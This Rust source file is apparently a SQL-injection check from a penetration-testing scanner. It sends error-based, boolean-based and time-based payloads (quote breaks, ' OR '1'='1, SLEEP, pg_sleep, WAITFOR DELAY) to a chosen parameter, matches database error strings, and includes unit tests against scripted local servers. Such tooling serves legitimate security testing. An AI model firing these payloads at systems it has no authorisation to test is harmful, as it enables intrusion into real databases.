//! sqli — reflected SQL-injection probe (error, boolean, time based).
//!
//! Port of `checks/sqli.py`.

use crate::checks::similarity;
use crate::opts::Opts;
use crate::registry::CheckFuture;
use pentest_core::{Finding, HttpClient, HttpRequest, Severity};
use std::sync::LazyLock;

pub const NAME: &str = "sqli";

static ERROR_RE: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(
        r#"(?i)SQL syntax.*MySQL|Warning.*mysqli?|MySqlException|check the manual that corresponds to your (?:MySQL|MariaDB)|PostgreSQL.*ERROR|pg_query\(\)|PG::SyntaxError|unterminated quoted string|SQLiteException|sqlite3\.OperationalError|Microsoft SQL (?:Server|Native Client)|ODBC SQL Server Driver|Unclosed quotation mark after the character string|ORA-\d{5}|quoted string not properly terminated|DB2 SQL error"#,
    )
    .unwrap()
});

const ERROR_PAYLOADS: &[&str] = &["'", "\"", "')", "';", "' OR '1"];
const BOOL_PAIRS: &[(&str, &str)] = &[
    ("' OR '1'='1", "' OR '1'='2"),
    (" OR 1=1-- -", " OR 1=2-- -"),
];

async fn send(
    client: &HttpClient,
    method: &str,
    param: &str,
    base: &str,
    payload: &str,
) -> Option<pentest_core::HttpResponse> {
    let val = format!("{base}{payload}");
    let req = if method == "POST" {
        HttpRequest::post().form_field(param, val)
    } else {
        HttpRequest::get().param(param, val)
    };
    client.request(req).await.ok()
}

pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
    Box::pin(run_impl(client, opts))
}

async fn run_impl(client: &HttpClient, opts: &Opts) -> Vec<Finding> {
    let mut out = Vec::new();
    let Some(param) = &opts.param else {
        return out;
    };
    let method = opts.method.to_uppercase();
    let base = &opts.base_value;
    let sleep_s = opts.sleep;

    let Some(baseline) = send(client, &method, param, base, "").await else {
        return out;
    };

    for p in ERROR_PAYLOADS {
        let Some(r) = send(client, &method, param, base, p).await else {
            continue;
        };
        if let Some(m) = ERROR_RE.find(&r.body) {
            if ERROR_RE.find(&baseline.body).is_none() {
                let mut f = Finding::new(
                    NAME,
                    Severity::Critical,
                    "Error-based SQL injection",
                    format!("payload {p:?} surfaced a DB error"),
                )
                .with_evidence(m.as_str());
                f.payload = format!("{base}{p}");
                out.push(f);
                break;
            }
        }
    }

    for (true_p, false_p) in BOOL_PAIRS {
        let Some(t) = send(client, &method, param, base, true_p).await else {
            continue;
        };
        let Some(f_resp) = send(client, &method, param, base, false_p).await else {
            continue;
        };
        let sim_true_base = similarity(&t.body, &baseline.body);
        let sim_true_false = similarity(&t.body, &f_resp.body);
        if sim_true_base > 0.95 && sim_true_false < 0.90 {
            let mut fnd = Finding::new(
                NAME,
                Severity::Critical,
                "Boolean-based blind SQL injection",
                format!("{true_p:?} matches baseline, {false_p:?} diverges"),
            )
            .with_evidence(format!("T/F sim={sim_true_false:.2}"));
            fnd.payload = format!("{base}{true_p}");
            out.push(fnd);
            break;
        }
    }

    let time_payloads = [
        format!("' OR SLEEP({sleep_s})-- -"),
        format!("'; SELECT pg_sleep({sleep_s})-- -"),
        format!("'; WAITFOR DELAY '0:0:{sleep_s}'-- -"),
    ];
    for p in &time_payloads {
        let Some(r) = send(client, &method, param, base, p).await else {
            continue;
        };
        let elapsed = r.elapsed.as_secs_f64();
        let baseline_elapsed = baseline.elapsed.as_secs_f64();
        if elapsed >= sleep_s as f64 * 0.8 && elapsed > baseline_elapsed + sleep_s as f64 * 0.6 {
            let Some(r2) = send(client, &method, param, base, p).await else {
                continue;
            };
            let elapsed2 = r2.elapsed.as_secs_f64();
            if elapsed2 >= sleep_s as f64 * 0.8
                && elapsed2 > baseline_elapsed + sleep_s as f64 * 0.6
            {
                let mut fnd = Finding::new(
                    NAME,
                    Severity::Critical,
                    "Time-based blind SQL injection",
                    format!(
                        "payload delayed response to {elapsed:.1}s, confirmed on repeat at {elapsed2:.1}s (baseline {baseline_elapsed:.1}s)"
                    ),
                )
                .with_evidence(p.clone());
                fnd.payload = p.clone();
                out.push(fnd);
                break;
            }
        }
    }

    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::test_support::{scripted_server, ScriptedResponse};
    use pentest_core::HttpClientConfig;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    fn fast_client(base_url: String) -> HttpClient {
        let config = HttpClientConfig {
            delay: std::time::Duration::from_millis(0),
            ..HttpClientConfig::default()
        };
        HttpClient::new(base_url, config)
    }

    #[tokio::test]
    async fn detects_error_based_injection() {
        let base = scripted_server(|req, _| {
            let v = req.query.get("id").cloned().unwrap_or_default();
            if v.contains('\'') {
                ScriptedResponse::ok("You have an error in your SQL syntax; check the manual that corresponds to your MySQL server")
            } else {
                ScriptedResponse::ok("normal page")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("id".to_string()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "Error-based SQL injection");
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[tokio::test]
    async fn no_error_based_finding_when_the_db_error_is_in_the_baseline() {
        let base = scripted_server(|_req, _| {
            ScriptedResponse::ok("You have an error in your SQL syntax; check the manual that corresponds to your MySQL server")
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("id".to_string()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert!(
            findings.is_empty(),
            "a baseline that already renders the DB error must not be flagged as injection"
        );
    }

    #[tokio::test]
    async fn detects_time_based_blind_injection() {
        let base = scripted_server(|req, _| {
            let v = req.query.get("id").cloned().unwrap_or_default();
            if v.to_uppercase().contains("SLEEP")
                || v.to_uppercase().contains("WAITFOR")
                || v.to_uppercase().contains("PG_SLEEP")
            {
                ScriptedResponse::delayed("ok", 850)
            } else {
                ScriptedResponse::ok("ok")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("id".to_string()),
            sleep: 1,
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        let fnd = findings
            .iter()
            .find(|f| f.title == "Time-based blind SQL injection")
            .expect("consistently slow payload must be flagged");
        assert_eq!(fnd.severity, Severity::Critical);
        assert!(
            fnd.detail.contains("repeat"),
            "detail must mention the repeated confirmation, got: {fnd:?}"
        );
    }

    #[tokio::test]
    async fn no_time_based_finding_from_a_single_slow_response() {
        let slow_once = Arc::new(AtomicBool::new(false));
        let hit = Arc::clone(&slow_once);
        let base = scripted_server(move |req, _| {
            let v = req.query.get("id").cloned().unwrap_or_default();
            let slow = v.to_uppercase().contains("SLEEP") && !hit.swap(true, Ordering::SeqCst);
            if slow {
                ScriptedResponse::delayed("ok", 850)
            } else {
                ScriptedResponse::ok("ok")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("id".to_string()),
            sleep: 1,
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert!(
            findings.is_empty(),
            "one slow response must not count as time-based blind SQLi"
        );
    }

    #[tokio::test]
    async fn no_findings_against_a_clean_target() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("static page, no db")).await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("id".to_string()),
            sleep: 1,
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn returns_empty_without_a_param() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("ok")).await;
        let client = fast_client(base);
        let findings = run_impl(&client, &Opts::default()).await;
        assert!(findings.is_empty());
    }
}
